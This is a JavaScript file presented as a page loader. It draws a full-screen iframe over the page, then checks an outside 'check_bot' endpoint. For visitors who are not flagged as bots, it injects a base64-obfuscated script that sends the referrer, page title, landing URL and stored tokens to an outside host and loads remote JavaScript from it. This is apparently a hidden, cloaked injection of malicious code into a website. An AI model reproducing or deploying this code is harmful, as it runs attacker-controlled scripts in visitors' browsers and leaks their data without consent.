const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfM2R6ZEI5WHRTS3M5S3lNWSc7CiAgICBpZiAoIXdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWSkgewogICAgICAgIHdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vZnduZjZmM3AnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfOFJ0RFNrcUZtRmpCeFo2VyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgXzhSdERTa3FGbUZqQnhaNlcgIT09ICd1bmRlZmluZWQnICYmIF84UnREU2txRm1GakJ4WjZXICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF8zdmtMRFhjWjVxZzI1Z2Q0ID0gSlNPTi5wYXJzZShfOFJ0RFNrcUZtRmpCeFo2Vyk7CiAgICAgICAgdmFyIF9ZRDdDbmhrbXpkVFR5enJyID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoXzN2a0xEWGNaNXFnMjVnZDQuY3JlYXRlZF9hdCArIHdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWS50dGwgPCBfWUQ3Q25oa216ZFRUeXpycikgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX0hwdmozTUtLWTNTaFZ5TFEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfWmZIcUp0dEpQUHdXNHZjdyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF85U2NNNjg1dDNieFByMVZ3ID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF85U2NNNjg1dDNieFByMVZ3ICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF85U2NNNjg1dDNieFByMVZ3ICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuXzNkemRCOVh0U0tzOUt5TVkuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX0hwdmozTUtLWTNTaFZ5TFEgIT09ICd1bmRlZmluZWQnICYmIF9IcHZqM01LS1kzU2hWeUxRICYmIHdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWS51bmlxdWUpIHsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9IcHZqM01LS1kzU2hWeUxRKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX1pmSHFKdHRKUFB3VzR2Y3cgIT09ICd1bmRlZmluZWQnICYmIF9aZkhxSnR0SlBQd1c0dmN3ICYmIHdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWS51bmlxdWUpIHsKICAgICAgICBfOVNjTTY4NXQzYnhQcjFWdyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1pmSHFKdHRKUFB3VzR2Y3cpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF85U2NNNjg1dDNieFByMVZ3ICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fM2R6ZEI5WHRTS3M5S3lNWS5SX1BBVEggKyBfOVNjTTY4NXQzYnhQcjFWdzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        setTimeout(() => {
            toggleLoad();
        }, 1000);
        
    })
})
